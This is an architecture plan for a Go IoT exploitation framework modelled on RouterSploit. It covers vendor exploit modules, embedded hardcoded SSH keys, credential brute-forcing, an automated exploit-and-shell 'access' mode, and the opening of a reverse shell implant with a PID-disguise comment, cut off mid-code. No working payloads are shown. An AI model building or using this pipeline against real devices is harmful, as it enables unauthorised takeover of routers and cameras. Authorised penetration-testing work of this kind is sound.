# GoAccess IoT Exploitation Framework — Master Implementation Plan

## 0. Overview

GoAccess is an active IoT exploitation framework written entirely in Go (CGO_ENABLED=0) with zero runtime dependencies. It provides a CLI tool with three operational modes (`identify`, `scan`, `access`) and is designed as a reusable library so other Go programs can import and extend it.

The framework is modeled after RouterSploit (Python) but redesigned from the ground up for Go's idiom: channel-based concurrency, composition over inheritance via embedded structs, and `go:embed` for all static data.

---

## 1. Repository Structure

```
goaccess/                                          # Git repo root = Go module
│
├── go.mod                                         # module github.com/cookiengineer/goaccess
├── go.sum
├── Makefile                                       # cross-compile rshell payloads, build targets
├── LICENSE
├── README.md
│
├── interfaces/                                    # ALL interfaces in one place
│   ├── exploit.go                                 # Exploit, ExecuteExploit, CredsModule
│   ├── scanner.go                                 # Scanner interface
│   └── password.go                                # PasswordGenerator interface
│
├── types/                                          # ALL data types in one place
│   ├── protocol.go                                # Protocol enum (iota)
│   ├── info.go                                     # Info struct (exploit metadata)
│   ├── options.go                                  # Options struct
│   ├── fingerprint.go                              # Fingerprint struct
│   ├── result.go                                   # VulnResult, CredsResult, ExploitResult
│   ├── access.go                                   # AccessResult, AccessStep
│   ├── scan.go                                     # ScanResult, ScanConfig
│   └── credentials.go                              # Credential struct
│
├── exploit/                                       # Global exploit registry (public API)
│   └── registry.go                                # Register(), All(), ByVendor(), ByModel(), ByDeviceType(), Get()
│
├── scanner/                                       # Scan engine (channel-based goroutine pools)
│   ├── scanner.go                                 # Scanner struct: Identify(), Scan(), Access()
│   ├── dispatcher.go                              # Worker pool dispatch + job/result channels
│   ├── portscan.go                                # Lightweight TCP SYN/connect scanner
│   └── scanner_test.go
│
├── protocols/                                     # Network protocol helpers
│   ├── http/
│   │   ├── http.go                                # HTTPClient: Get, Post, Head, Do, DoReq
│   │   └── http_test.go
│   ├── tcp/
│   │   ├── tcp.go                                 # TCPClient: Connect, Send, Recv, RecvAll, Close
│   │   └── tcp_test.go
│   ├── udp/
│   │   ├── udp.go                                 # UDPClient: Send, Recv, Close
│   │   └── udp_test.go
│   ├── ssh/
│   │   ├── ssh.go                                 # SSHClient: Login, Execute, Interactive, TestConnect, SCP
│   │   └── ssh_test.go
│   ├── telnet/
│   │   ├── telnet.go                              # TelnetClient: Login, Write, ReadUntil, TestConnect
│   │   └── telnet_test.go
│   ├── ftp/
│   │   ├── ftp.go                                 # FTPClient: Login, CWD, RETR, LIST, STOR
│   │   └── ftp_test.go
│   └── snmp/
│       ├── snmp.go                                # SNMPClient: Get, Walk, GetNext, GetBulk
│       └── snmp_test.go
│
├── shell/                                         # Reverse/bind shell handler
│   ├── shell.go                                   # Shell handler: StartReverse(), StartBind(), Interact()
│   ├── listener.go                                # Listener: TCP listener + HTTP payload server (wget method)
│   └── shell_test.go
│
├── oui/                                           # MAC OUI vendor database
│   ├── oui.go                                     # Lookup(mac) string, Parse()
│   ├── oui_test.go
│   └── oui.dat                                    # go:embed IEEE OUI database (23,798 lines)
│
├── wordlist/                                      # Credential wordlists
│   ├── wordlist.go                                # Loader, Iterator, FromFile(), FromSlice()
│   ├── data.go                                    # go:embed defaults.txt, passwords.txt, usernames.txt, snmp.txt
│   ├── wordlist_test.go
│   ├── defaults.txt                               # go:embed (653 lines, user:pass pairs)
│   ├── passwords.txt                              # go:embed (716 lines, passwords only)
│   ├── usernames.txt                              # go:embed (354 lines, usernames only)
│   └── snmp.txt                                   # go:embed (120 lines, SNMP community strings)
│
├── report/                                        # Output formatting
│   ├── report.go                                  # Color helpers, table printing, JSON encoder
│   └── report_test.go
│
├── libs/                                          # Utility libraries (ported from Python)
│   └── lzs/
│       ├── lzs.go                                 # LZS decompression algorithm
│       └── lzs_test.go
│
├── payload/                                       # Pre-built multi-arch reverse shell binary payloads
│   ├── payload.go                                 # Registry: GetPayload(arch, handler) []byte, ListArchitectures()
│   ├── payload_test.go
│   ├── arm/
│   │   ├── reverse_tcp                            # Pre-compiled binary (go:embed via payload.go)
│   │   └── bind_tcp
│   ├── arm64/
│   │   ├── reverse_tcp
│   │   └── bind_tcp
│   ├── mips/
│   │   ├── reverse_tcp
│   │   └── bind_tcp
│   ├── mipsle/
│   │   ├── reverse_tcp
│   │   └── bind_tcp
│   ├── mips64/
│   │   ├── reverse_tcp
│   │   └── bind_tcp
│   ├── x86/
│   │   ├── reverse_tcp
│   │   └── bind_tcp
│   └── x86_64/
│       ├── reverse_tcp
│       └── bind_tcp
│
├── ssh_keys/                                      # Known hardcoded SSH private keys
│   ├── keys.go                                    # go:embed FS + KeyRegistry: GetKey(vendor, model) ([]byte, string)
│   ├── generic/
│   │   └── vagrant/
│   │       ├── vagrant.key                        # PEM encoded private key
│   │       └── vagrant.json                       # {"username": "vagrant", "type": "RSA", "comment": "..."}
│   ├── fortinet/
│   │   └── fortigate/
│   │       ├── fortigate.key
│   │       └── fortigate.json
│   ├── f5/
│   │   └── bigip/
│   │       ├── bigip.key
│   │       └── bigip.json
│   ├── barracuda/
│   │   └── load_balancer/
│   │       ├── load_balancer.key
│   │       └── load_balancer.json
│   ├── exagrid/
│   │   └── cve_2016_1561/
│   │       ├── exagrid.key
│   │       └── exagrid.json
│   ├── quantum/
│   │   └── dxi_v1000/
│   │       ├── quantum.key
│   │       └── quantum.json
│   ├── array_networks/
│   │   └── vapv_vxag/
│   │       ├── array_networks.key
│   │       └── array_networks.json
│   ├── ceragon/
│   │   └── fibeair/
│   │       ├── ceragon.key
│   │       └── ceragon.json
│   ├── monroe/
│   │   └── dasdec/
│   │       ├── monroe.key
│   │       └── monroe.json
│   └── loadbalancer/
│       └── enterprise_va/
│           ├── loadbalancer.key
│           └── loadbalancer.json
│
├── exploits/                                      # All exploit modules
│   ├── exploits.go                                # Package doc + auto-registration entry point
│   ├── imports.go                                 # Blank imports for all exploit sub-packages
│   │                                               # (Each import triggers init() -> registry.Register())
│   │
│   ├── generic/                                   # Multi-vendor / protocol-level exploits
│   │   ├── imports.go                             # Imports all generic exploit packages
│   │   ├── creds/
│   │   │   ├── telnet_default.go                  # Generic telnet default creds module
│   │   │   ├── ssh_default.go                     # Generic SSH default creds module
│   │   │   ├── ftp_default.go                     # Generic FTP default creds module
│   │   │   ├── http_basic_digest_default.go       # Generic HTTP Basic/Digest auth default creds
│   │   │   ├── snmp_default.go                    # Generic SNMP community string bruteforce
│   │   │   ├── ssh_auth_keys.go                   # Generic SSH hardcoded key auth module
│   │   │   └── imports.go
│   │   ├── heartbleed/
│   │   │   ├── exploit.go                         # CVE-2014-0160 OpenSSL Heartbleed
│   │   │   └── exploit_test.go
│   │   ├── shellshock/
│   │   │   ├── exploit.go                         # CVE-2014-6271 Bash Shellshock
│   │   │   └── exploit_test.go
│   │   ├── tcp_32764/
│   │   │   ├── rce/
│   │   │   │   ├── exploit.go                     # SerComm TCP-32764 backdoor RCE
│   │   │   │   └── exploit_test.go
│   │   │   └── info_disclosure/
│   │   │       ├── exploit.go                     # SerComm TCP-32764 info disclosure
│   │   │       └── exploit_test.go
│   │   ├── rom_0/
│   │   │   ├── exploit.go                         # RomPager ROM-0 credential extraction
│   │   │   └── exploit_test.go
│   │   └── gpon_home_gateway/
│   │       ├── exploit.go                         # GPON Home Gateway RCE (CVE-2018-10561)
│   │       └── exploit_test.go
│   │
│   ├── routers/                                   # Router-specific exploits
│   │   ├── imports.go                             # Imports all vendor sub-packages
│   │   │
│   │   ├── dlink/
│   │   │   ├── imports.go                         # Imports all dlink exploit packages
│   │   │   ├── creds/
│   │   │   │   ├── telnet_default.go              # D-Link telnet defaults (self-contained wordlist)
│   │   │   │   ├── ssh_default.go
│   │   │   │   ├── ftp_default.go
│   │   │   │   └── imports.go
│   │   │   ├── dir_300_600_rce/
│   │   │   │   ├── exploit.go                     # CVE-2013-XXXX HNAP RCE
│   │   │   │   ├── exploit_test.go
│   │   │   │   └── fingerprints.go                # Opt: detection signatures
│   │   │   ├── dir_300_645_815_upnp_rce/
│   │   │   │   ├── exploit.go                     # UPnP command injection
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_300_320_600_615_info_disclosure/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_300_320_615_auth_bypass/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_645_815_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_645_password_disclosure/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_655_866_652_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_815_850l_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_825_path_traversal/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_850l_creds_disclosure/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dir_8xx_password_disclosure/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dns_320l_327l_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dsl_2640b_dns_change/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dsl_2730_2750_path_traversal/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dsl_2730b_2780b_526b_dns_change/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dsl_2740r_dns_change/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dsl_2750b_info_disclosure/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dsl_2750b_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dsp_w110_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dvg_n5402sp_path_traversal/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dwl_3200ap_password_disclosure/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dwr_932b_backdoor/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dwr_932_info_disclosure/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dgs_1510_add_user/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── dcs_930l_auth_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── multi_hedwig_cgi_exec/
│   │   │   │   ├── exploit.go                     # Multi-model hedwig.cgi RCE
│   │   │   │   └── exploit_test.go
│   │   │   └── multi_hnap_rce/
│   │   │       ├── exploit.go                     # Multi-model HNAP RCE (SOAPAction header)
│   │   │       └── exploit_test.go
│   │   │
│   │   ├── tplink/
│   │   │   ├── imports.go
│   │   │   ├── creds/
│   │   │   │   ├── telnet_default.go
│   │   │   │   ├── ssh_default.go
│   │   │   │   ├── ftp_default.go
│   │   │   │   └── imports.go
│   │   │   ├── archer_c2_c20i_rce/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── archer_c9_admin_password_reset/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── wdr740nd_wdr740n_backdoor/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   ├── wdr740nd_wdr740n_path_traversal/
│   │   │   │   ├── exploit.go
│   │   │   │   └── exploit_test.go
│   │   │   └── wdr842nd_wdr842n_configure_disclosure/
│   │   │       ├── exploit.go
│   │   │       └── exploit_test.go
│   │   │
│   │   ├── cisco/
│   │   │   ├── imports.go
│   │   │   ├── creds/ (telnet, ssh, ftp)
│   │   │   ├── rv320_command_injection/
│   │   │   ├── catalyst_2960_rocem/
│   │   │   ├── dpc2420_info_disclosure/
│   │   │   ├── firepower_management60_path_traversal/
│   │   │   ├── firepower_management60_rce/
│   │   │   ├── ios_http_authorization_bypass/
│   │   │   ├── secure_acs_bypass/
│   │   │   ├── ucm_info_disclosure/
│   │   │   ├── ucs_manager_rce/
│   │   │   └── unified_multi_path_traversal/
│   │   │
│   │   ├── netgear/
│   │   │   ├── imports.go
│   │   │   ├── creds/ (telnet, ssh, ftp)
│   │   │   ├── dgn2200_dnslookup_cgi_rce/
│   │   │   ├── dgn2200_ping_cgi_rce/
│   │   │   ├── jnr1010_path_traversal/
│   │   │   ├── multi_password_disclosure_2017_5521/
│   │   │   ├── multi_rce/
│   │   │   ├── n300_auth_bypass/
│   │   │   ├── prosafe_rce/
│   │   │   ├── r7000_r6400_rce/
│   │   │   ├── rax30_rce/
│   │   │   └── wnr500_612v3_jnr1010_2010_path_traversal/
│   │   │
│   │   ├── linksys/    (imports.go + creds/ + 5 exploits)
│   │   ├── asus/       (imports.go + creds/ + 3 exploits)
│   │   ├── mikrotik/   (imports.go + creds/ + 2 exploits)
│   │   ├── huawei/     (imports.go + creds/ + 5 exploits)
│   │   ├── belkin/     (imports.go + creds/ + 6 exploits)
│   │   ├── zyxel/      (imports.go + creds/ + 5 exploits)
│   │   ├── multi/      (gpon_home_gateway, misfortune_cookie, tcp_32764, rom0 — moved to generic)
│   │   ├── 3com/        (imports.go + creds/ + 5 exploits)
│   │   ├── technicolor/ (imports.go + creds/ + 4 exploits)
│   │   ├── ipfire/      (imports.go + creds/ + 3 exploits)
│   │   ├── zte/         (imports.go + creds/ + 3 exploits)
│   │   ├── fortinet/    (imports.go + creds/ + 1 exploit)
│   │   ├── ubiquiti/    (imports.go + creds/ + 1 exploit)
│   │   ├── 2wire/       (imports.go + creds/ + 2 exploits)
│   │   ├── asmax/       (imports.go + creds/ + 2 exploits)
│   │   ├── billion/     (imports.go + creds/ + 2 exploits)
│   │   ├── bhu/         (imports.go + creds/ + 1 exploit)
│   │   ├── comtrend/    (imports.go + creds/ + 1 exploit)
│   │   ├── lg/          (imports.go + creds/ + 1 exploit)
│   │   ├── movistar/    (imports.go + creds/ + 1 exploit)
│   │   ├── netcore/     (imports.go + creds/ + 1 exploit)
│   │   ├── netsys/      (imports.go + creds/ + 1 exploit)
│   │   ├── shuttle/     (imports.go + creds/ + 1 exploit)
│   │   └── thomson/     (imports.go + creds/ + 2 exploits)
│   │
│   ├── cameras/                                   # Camera-specific exploits
│   │   ├── imports.go
│   │   ├── creds/
│   │   │   ├── imports.go
│   │   │   ├── acti/        (telnet, ssh, ftp, http)
│   │   │   ├── american_dynamics/
│   │   │   ├── arecont/
│   │   │   ├── avigilon/
│   │   │   ├── avtech/
│   │   │   ├── axis/        (telnet, ssh, ftp, http)
│   │   │   ├── basler/      (telnet, ssh, ftp, http)
│   │   │   ├── brickcom/    (telnet, ssh, ftp, http)
│   │   │   ├── canon/       (telnet, ssh, ftp, http)
│   │   │   ├── cisco/
│   │   │   ├── dlink/
│   │   │   ├── geovision/
│   │   │   ├── grandstream/
│   │   │   ├── hikvision/
│   │   │   ├── honeywell/
│   │   │   ├── iqinvision/
│   │   │   ├── jvc/
│   │   │   ├── mobotix/
│   │   │   ├── samsung/
│   │   │   ├── sentry360/
│   │   │   ├── siemens/
│   │   │   ├── speco/
│   │   │   ├── stardot/
│   │   │   ├── vacron/
│   │   │   └── videoiq/
│   │   ├── multi/          (6 exploits: P2P_wificam, cctv_dvr, dvr_creds, etc.)
│   │   ├── acti/
│   │   ├── avigilon/
│   │   ├── beward/
│   │   ├── brickcom/
│   │   ├── cisco/
│   │   ├── dlink/
│   │   │   └── dcs_930l_932l_auth_bypass/
│   │   ├── geuterbruck/
│   │   ├── grandstream/
│   │   ├── honeywell/
│   │   ├── jovision/
│   │   ├── mvpower/
│   │   ├── siemens/
│   │   └── xiongmai/
│   │
│   └── misc/                                     # Miscellaneous device exploits
│       ├── imports.go
│       ├── asus/
│       │   └── b1m_projector_rce/
│       ├── miele/
│       │   └── pg8528_path_traversal/
│       ├── watchguard/
│       │   └── xcs_9_rce/
│       └── wepresent/
│           └── wipg1000_rce/
│
├── cmds/
│   ├── goaccess/
│   │   └── main.go                                # CLI binary (flag-based, no runtime deps)
│   └── rshell/
│       └── main.go                                # Reverse shell implant (standalone binary)
│
├── actions/                                       # CLI action implementations
│   ├── identify.go                                # Identify target hardware
│   ├── scan.go                                    # Scan target for vulnerabilities
│   └── access.go                                  # Actively exploit + gain access
│
├── docs/
│   ├── MASTERPLAN.md                              # This file
│   ├── EXPLOITS.md                                # Exploit porting plan & conventions
│   └── TODO.md                                    # Phase-by-phase task list
│
└── reference_codebases/                           # RouterSploit reference (existing, read-only)
    └── routersploit/
```

---

## 2. Types Package (`types/`)

All data structures. Zero dependencies on other project packages (stdlib only).

### 2.1 `types/protocol.go`

```go
package types

type Protocol int

const (
    ProtocolHTTP   Protocol = iota  // http (TCP port 80)
    ProtocolHTTPS                    // https (TCP port 443)
    ProtocolTCP                      // raw TCP
    ProtocolUDP                      // raw UDP
    ProtocolSSH                      // SSH (TCP port 22)
    ProtocolTelnet                   // Telnet (TCP port 23)
    ProtocolFTP                      // FTP (TCP port 21)
    ProtocolSNMP                     // SNMP (UDP port 161)
)

func (p Protocol) String() string
func (p Protocol) DefaultPort() int
```

### 2.2 `types/info.go`

```go
package types

type DeviceType string

const (
    DeviceRouter  DeviceType = "router"
    DeviceCamera  DeviceType = "camera"
    DeviceMisc    DeviceType = "misc"
    DeviceGeneric DeviceType = "generic"
)

type Info struct {
    Name        string     // "D-Link DIR-300 RCE"
    Description string     // Full human-readable description
    Vendor      string     // lowercase: "dlink", "tplink", "cisco"
    DeviceType  DeviceType // DeviceRouter, DeviceCamera, DeviceMisc
    Models      []string   // ["DIR-300", "DIR-600", "DIR-815"]
    CVE         []string   // ["CVE-2013-XXXX"]
    References  []string   // URLs to advisories, exploit-db, etc.
}
```

### 2.3 `types/options.go`

```go
package types

import "time"

type Options struct {
    Target  string        // IP address or hostname
    Port    int           // target port
    SSL     bool          // use TLS
    Timeout time.Duration // connection/read timeout
    Verbose bool          // verbose output

    // Authentication
    Username string
    Password string

    // File paths for path traversal exploits
    Filename string // e.g. "/etc/shadow"

    // Credential wordlist
    Defaults []string // ["admin:admin", "root:12345", ...]

    // Shell configuration
    LHOST    string // listen host for reverse shells
    LPORT    int    // listen port for reverse shells
    RHOST    string // remote host for bind shells
    RPORT    int    // remote port for bind shells
    Payload  string // payload architecture (e.g. "arm", "mipsle")
    Method   string // transfer method ("wget", "echo", "cmd")

    // Extra module-specific parameters
    Extra map[string]interface{}
}
```

### 2.4 `types/fingerprint.go`

```go
package types

type Fingerprint struct {
    // HTTP-based hints
    URL     string            // "/HNAP1/"
    Method  string            // "GET", "POST"
    Headers map[string]string // expected response headers (e.g. "Server": "DIR-")
    Body    string            // expected substring in response body

    // Raw TCP/UDP banner hints
    Banner string // substring expected in raw TCP/UDP response

    // UPnP SSDP hints
    UPnPResponse string // substring expected in M-SEARCH response

    // SNMP hints
    SNMPOID   string // "1.3.6.1.2.1.1.1.0" (sysDescr)
    SNMPValue string // expected substring in response

    // MAC OUI prefixes for ARP-based identification
    MACPrefixes []string // ["00:50:BA", "1C:AF:F7"]

    // Known firmware version patterns
    FirmwarePatterns []FirmwarePattern
}

type FirmwarePattern struct {
    URL     string // URL path that reveals firmware version
    Pattern string // regex pattern to extract version from response
    Group   int    // regex capture group for version
}
```

### 2.5 `types/result.go`

```go
package types

type VulnResult struct {
    Confirmed bool   // true if vulnerability confirmed
    Details   string // human-readable description of what was found
    RawData   []byte // raw response data (for evidence)
}

type CredsResult struct {
    Target   string // IP address
    Port     int
    Service  string   // "telnet", "ssh", "http", "ftp"
    Protocol Protocol // enum value
    Username string
    Password string
}

type ExploitResult struct {
    Success bool
    Action  string // "etc_passwd_read", "admin_created", "shell_spawned", "creds_dumped"
    Output  string // command output or file content
    Files   map[string][]byte // filename -> raw content (for multi-file extraction)
}
```

### 2.6 `types/access.go`

```go
package types

type AccessStep int

const (
    StepIdentify     AccessStep = iota  // Fingerprint device
    StepCredsRecover                     // Recover credentials
    StepExploit                          // Run exploits
    StepShell                            // Deploy/maintain shell
    StepComplete                         // Access achieved
    StepFailed                           // Access failed
)

type AccessResult struct {
    Target      string
    Vendor      string
    Model       string
    Credentials []*CredsResult    // Found credentials
    Exploits    []*ExploitResult  // Successful exploits
    Shell       *ShellSession     // Established shell (if any)
    Steps       []AccessStepLog   // Step-by-step log
    Success     bool
}

type AccessStepLog struct {
    Step    AccessStep
    Success bool
    Detail  string
    Error   error
}

type ShellSession struct {
    Type     string // "reverse", "bind", "ssh", "telnet"
    Conn     net.Conn
    Host     string
    Port     int
}
```

### 2.7 `types/scan.go`

```go
package types

type ScanConfig struct {
    Target       string
    Threads      int
    Timeout      time.Duration
    Verbose      bool
    VendorFilter string     // filter exploits by vendor
    TypeFilter   DeviceType // filter exploits by device type
    SkipCreds    bool       // skip credential checks
    SkipExploits bool       // skip vulnerability checks
    MACAddress   string     // pre-resolved MAC for OUI lookup
}

type ScanResult struct {
    Exploit   *Info         // exploit info
    Vuln      *VulnResult   // check result (nil if not vulnerable)
    Creds     []*CredsResult // credential results (from creds modules)
    Err       error         // any error during check
    Module    string        // module path string
    Timestamp time.Time
}
```

### 2.8 `types/credentials.go`

```go
package types

type Credential struct {
    Username string
    Password string
}

func (c Credential) String() string // "username:password"
```

---

## 3. Interfaces Package (`interfaces/`)

All interfaces in one place. Imports `types/` only.

### 3.1 `interfaces/exploit.go`

```go
package interfaces

import "github.com/cookiengineer/goaccess/types"

// Exploit is the core interface every exploit module must implement.
// Exploits self-register via init() -> exploit.Register().
type Exploit interface {
    // Info returns static metadata: name, vendor, models, CVE, references.
    Info() *types.Info

    // Check verifies whether the target is vulnerable.
    // Returns VulnResult if vulnerable, nil if not, error if check could not be performed.
    // Must be safe for concurrent calls (no shared mutable state).
    Check(target string, opts *types.Options) (*types.VulnResult, error)

    // Run executes the exploit against the target.
    // Returns the exploitation result or error on failure.
    Run(target string, opts *types.Options) (*types.ExploitResult, error)

    // Fingerprints returns optional detection signatures for the identify phase.
    // If nil or empty, only Check() is used to match the exploit.
    Fingerprints() []*types.Fingerprint

    // Options returns the configurable parameters for this exploit.
    Options() *types.Options

    // Protocol returns which network protocol this exploit targets.
    Protocol() types.Protocol
}

// ExecuteExploit extends Exploit for RCE exploits that support
// interactive command execution on an already-compromised target.
type ExecuteExploit interface {
    Exploit

    // Execute runs a single shell command on the compromised target.
    // Returns the command output or error.
    Execute(cmd string) (string, error)
}

// CredsModule extends Exploit for credential brute-force / default-credential modules.
type CredsModule interface {
    Exploit

    // CheckDefault runs the credential check silently (no verbose output)
    // and returns found credentials. Returns nil if none found.
    CheckDefault(target string, opts *types.Options) ([]*types.CredsResult, error)
}
```

### 3.2 `interfaces/scanner.go`

```go
package interfaces

import "github.com/cookiengineer/goaccess/types"

// Scanner defines the high-level scanning interface.
// The concrete scanner/Scanner is the primary implementation.
type Scanner interface {
    // Identify fingerprints a target and returns vendor/model/OS/firmware.
    Identify(target string, config *types.ScanConfig) (*types.FingerprintResult, error)

    // Scan runs vulnerability checks and credential brute-force against a target.
    // Results are streamed through the returned channel.
    // The channel is closed when scanning completes.
    Scan(target string, config *types.ScanConfig) (<-chan *types.ScanResult, error)

    // Access actively exploits a target to gain access (shell or credentials).
    // Returns the access result on completion.
    Access(target string, config *types.ScanConfig) (*types.AccessResult, error)
}
```

### 3.3 `interfaces/password.go`

```go
package interfaces

import "github.com/cookiengineer/goaccess/types"

// PasswordGenerator generates possible passwords for a given device
// based on known password derivation algorithms (MAC-derived, serial-derived, etc.).
// Each vendor can implement their own generator.
type PasswordGenerator interface {
    // Generate returns a slice of credential pairs based on device-specific data.
    // mac: MAC address (e.g. "00:50:BA:12:34:56")
    // serial: device serial number if known
    // model: device model string
    Generate(mac, serial, model string) []types.Credential

    // Name returns a human-readable name for this generator (e.g. "D-Link WPA Default Key Gen")
    Name() string

    // Vendor returns the vendor this generator applies to
    Vendor() string
}
```

---

## 4. Exploit Registry (`exploit/registry.go`)

The global registry is the central discovery mechanism. All exploit packages call `Register()` in their `init()`.

```go
package exploit

var (
    mu       sync.RWMutex
    exploits []interfaces.Exploit
    creds    []interfaces.CredsModule
    generators []interfaces.PasswordGenerator
)

func Register(e interfaces.Exploit)
func RegisterCreds(c interfaces.CredsModule)
func RegisterPasswordGenerator(g interfaces.PasswordGenerator)

// Query functions
func All() []interfaces.Exploit
func AllCreds() []interfaces.CredsModule
func ByVendor(vendor string) []interfaces.Exploit
func ByModel(vendor, model string) []interfaces.Exploit
func ByDeviceType(dt types.DeviceType) []interfaces.Exploit
func ByProtocol(p types.Protocol) []interfaces.Exploit
func CredsByVendor(vendor string) []interfaces.CredsModule
func Get(name string) (interfaces.Exploit, error)
func Count() int
func CredsCount() int
func PasswordGenerators() []interfaces.PasswordGenerator
```

---

## 5. Scanner Architecture (`scanner/`)

### 5.1 Scanner Struct

```go
package scanner

type Scanner struct {
    config *types.ScanConfig
    report *report.Report

    // Channel-based job dispatch
    jobs     chan *job
    results  chan *types.ScanResult
    done     chan struct{}

    // Mutable state (protected by mutex)
    mu             sync.RWMutex
    fingerprint    *types.FingerprintResult
    vulnerabilities []*types.VulnResult
    credentials    []*types.CredsResult
    errors         []error
}

type job struct {
    exploit  interfaces.Exploit
    taskType jobType // "check", "check_default", "fingerprint"
}
```

### 5.2 Identify Pipeline

```
target ──→ portScan()
                │
                ├──→ ARP resolution → MAC → oui.Lookup() → vendor hint
                │
                ├──→ HTTP HEAD / → Server header, WWW-Authenticate, title, favicon hash
                │
                ├──→ UPnP M-SEARCH → 239.255.255.250:1900 → USN/SERVER headers
                │
                ├──→ SNMP GET sysDescr → 1.3.6.1.2.1.1.1.0
                │
                ├──→ Iterate ALL registered exploits
                │    └─→ For each exploit with Fingerprints():
                │        └─→ Test each fingerprint against target
                │        └─→ If match → record vendor/model/firmware confidence
                │
                ╰──→ FingerprintResult{Vendor, Model, Firmware, Confidence}
```

### 5.3 Scan Pipeline

```
target ──→ Scanner.Scan()
                │
                ├─ Phase 1: Identify() → FingerprintResult
                │
                ├─ Phase 2: Exploit Checks
                │    ├─ exploit.ByVendor(fingerprint.Vendor) // filter
                │    ├─ Feed into jobs channel
                │    ├─ N workers → call exploit.Check()
                │    └─ Collector ← results channel → []VulnResult
                │
                ├─ Phase 3: Credential Checks
                │    ├─ exploit.CredsByVendor(fingerprint.Vendor) // filter
                │    ├─ Feed into jobs channel
                │    ├─ N workers → call creds.CheckDefault()
                │    └─ Collector ← results channel → []CredsResult
                │
                └─ Stream results through returned channel
```

### 5.4 Worker Pool

```go
func (s *Scanner) startWorkers(n int) {
    for i := 0; i < n; i++ {
        go s.worker(i)
    }
}

func (s *Scanner) worker(id int) {
    for j := range s.jobs {
        opts := j.exploit.Options()
        opts.Target = s.config.Target
        opts.Verbose = s.config.Verbose
        opts.Timeout = s.config.Timeout

        result := &types.ScanResult{
            Exploit:   j.exploit.Info(),
            Timestamp: time.Now(),
            Module:    getModulePath(j.exploit),
        }

        switch j.taskType {
        case taskCheck:
            result.Vuln, result.Err = j.exploit.Check(s.config.Target, opts)
        case taskCheckDefault:
            if cm, ok := j.exploit.(interfaces.CredsModule); ok {
                result.Creds, result.Err = cm.CheckDefault(s.config.Target, opts)
            }
        }

        s.results <- result
    }
}
```

---

## 6. Access Engine (Priority-Ordered Exploitation)

### 6.1 Access Pipeline

```
target ──→ Access()
                │
                ├─ Step 1: Identify() → FingerprintResult
                │
                ├─ Step 2: Credential Recovery (parallel)
                │    ├─ PasswordGenerators for vendor → generate passwords
                │    ├─ Telnet default creds (per-vendor)
                │    ├─ SSH default creds
                │    ├─ FTP default creds
                │    ├─ HTTP Basic/Digest auth default creds
                │    ├─ SNMP community strings
                │    └─ SSH hardcoded key auth (known backdoor keys)
                │    ╰─ Result: []CredsResult (if any found)
                │
                ├─ Step 3: Exploitation (priority-ordered)
                │    ├─ Priority 1: Credential disclosure exploits
                │    │   └─ dir_8xx_password_disclosure, rom_0, dir_645_password_disclosure, etc.
                │    ├─ Priority 2: Auth bypass + admin user creation
                │    │   └─ dgs_1510_add_user, fortigate_os_backdoor, etc.
                │    ├─ Priority 3: RCE exploits + shell deployment
                │    │   └─ All RCE exploits → execute reverse shell payload
                │    └─ Priority 4: Path traversal / info disclosure
                │        └─ dir_825_path_traversal, dcs_930l_auth_rce, etc.
                │
                ├─ Step 4: Shell Access (if possible)
                │    ├─ IF credentials found → SSH / Telnet login
                │    ├─ IF RCE achieved + shell deployed → reverse/bind shell interact
                │    └─ IF nothing succeeded → report credentials + instructions
                │
                ╰──→ AccessResult{Success, Credentials, Shell, ExploitResults}
```

### 6.2 Access Result Priority

**Best case**: Reverse shell / backdoor implant deployed and interactive session established.

**Fallback**: Credentials dumped + instructions on how/where to use them (SSH/telnet login instructions with host, port, username, password).

**Worst case**: No access achieved. Report on exploitable vulnerabilities found and what was attempted.

---

## 7. Reverse Shell Implant (`cmds/rshell/main.go`)

### 7.1 Design Requirements

- **CGO_ENABLED=0**: Pure Go, no C linkage
- **Minimal**: Single binary, statically linked
- **Environment-driven**: `RSHELL_HOST` and `RSHELL_PORT` environment variables
- **Retry logic**: Up to 30 attempts with 2-second delay
- **No artifacts**: Runs `/bin/sh`, no files written to disk

### 7.2 Implant Code (minimal)

```go
package main

import (
    "net"
    "os"
    "os/exec"
    "time"
)

func main() {
    host := os.Getenv("RSHELL_HOST")
    port := os.Getenv("RSHELL_PORT")
    if host == "" || port == "" {
        os.Exit(1)
    }

    // PID disguise and daemonize
    // ...

